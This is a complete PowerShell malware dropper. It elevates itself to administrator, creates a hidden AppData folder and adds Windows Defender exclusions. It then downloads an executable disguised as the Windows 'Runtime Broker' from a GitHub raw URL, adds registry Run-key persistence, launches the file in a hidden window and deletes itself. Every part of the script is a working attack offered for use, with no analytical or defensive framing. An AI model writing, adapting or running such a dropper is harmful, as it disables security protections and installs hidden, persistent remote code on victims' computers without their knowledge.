#Requires -Version 5.1
$ErrorActionPreference = 'SilentlyContinue'

# Elevate to admin if not already
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process pwsh -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 1. Create hidden folder in AppData
$hiddenDir = "$env:APPDATA\Apdata"
if (-not (Test-Path $hiddenDir)) {
    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
    Set-ItemProperty -Path $hiddenDir -Name Attributes -Value 'Hidden' -Force
}

# 2. Add exclusions to Windows Defender
$subDir = 'C:\Windows\System32\config\systemprofile\AppData\Roaming\SubDir'
Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $subDir -ErrorAction SilentlyContinue

# 3. Download and execute file
$url = 'https://raw.githubusercontent.com/salamprajjit-alt/5132525231/main/Runtime%20Broker.exe'
$output = "$hiddenDir\RuntimeBroker.exe"

# Download with stealthy techniques
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Set startup persistence via registry
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
Set-ItemProperty -Path $regPath -Name 'RuntimeBroker' -Value "`"$output`"" -Force

# Execute with hidden window
Start-Process -FilePath $output -WindowStyle Hidden

# Cleanup and self-deletion
Remove-Item -Path $PSCommandPath -Force